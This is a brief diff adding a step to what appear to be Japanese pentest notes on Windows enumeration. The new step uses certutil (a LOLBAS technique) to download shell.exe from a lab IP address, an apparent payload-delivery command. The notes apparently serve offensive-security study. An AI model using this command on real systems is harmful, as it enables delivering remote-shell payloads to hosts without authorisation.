@@ -71,3 +71,8 @@ schtasks /query /fo LIST /v
 ```
 sc qc apphostsvc
 ```
+
+13. LOLBASでcertutilを使ってファイルをダウンロードする。
+```
+certutil -urlcache -f http://192.168.45.216:80/shell.exe shell.exe
+```
